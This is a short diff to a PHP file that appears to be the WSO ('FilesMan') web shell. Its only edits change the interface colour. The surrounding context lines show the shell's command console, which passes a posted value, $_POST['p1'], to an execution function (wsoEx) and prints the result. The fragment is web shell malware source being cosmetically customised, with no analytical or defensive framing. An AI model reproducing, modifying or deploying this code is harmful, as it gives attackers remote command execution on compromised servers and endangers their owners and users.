@@ -1,5 +1,5 @@
 <?php
-	$color = "#df5";
+	$color = "#2980b9";
 	$default_action = 'FilesMan';
 	$default_use_ajax = true;
 	$default_charset = 'Windows-1251';
@@ -1149,7 +1149,7 @@ function add(cmd) {
 		echo htmlspecialchars("$ ".$_POST['p1']."\n".wsoEx($_POST['p1']));
 	}
 
-	echo '</textarea><table style="border:1px solid #df5;background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
+	echo '</textarea><table style="border:1px solid #2980b9;background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
 	echo '</form></div><script>d.cf.cmd.focus();</script>';
 	wsoFooter();
 }
